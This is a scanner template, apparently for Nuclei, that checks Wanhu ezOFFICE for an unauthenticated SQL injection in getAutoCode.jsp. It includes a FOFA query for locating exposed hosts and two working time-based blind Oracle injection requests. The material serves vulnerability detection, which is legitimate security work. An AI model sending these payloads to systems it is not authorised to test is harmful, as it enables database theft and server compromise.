id: wanhu-ezOFFICE-getAutoCode-sql

info:
  name: 万户 ezOFFICE协同管理平台 getAutoCode SQL注入漏洞(XVE-2024-18749)
  author: Superhero
  severity: high
  description: |-
    fofa: app="万户网络-ezOFFICE"
    万户 ezOFFICE getAutoCode.jsp 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://blog.csdn.net/m0_60571842/article/details/140929659
  tags: sql injection



http:
  - raw:
      - |
        GET /defaultroot/platform/custom/customizecenter/js/getAutoCode.jsp;.js?pageId=1&head=2%27+AND+6205%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2898%29%7C%7CCHR%2866%29%7C%7CCHR%2890%29%7C%7CCHR%28108%29%2C4%29--+YJdO&field=field_name&tabName=tfield HTTP/1.1 
        Host: {{Hostname}}


      - |
        GET /defaultroot/platform/custom/customizecenter/js/getAutoCode.jsp;.js?pageId=1&head=2%27+AND+6205%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2898%29%7C%7CCHR%2866%29%7C%7CCHR%2890%29%7C%7CCHR%28108%29%2C8%29--+YJdO&field=field_name&tabName=tfield HTTP/1.1 
        Host: {{Hostname}}


    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and


 




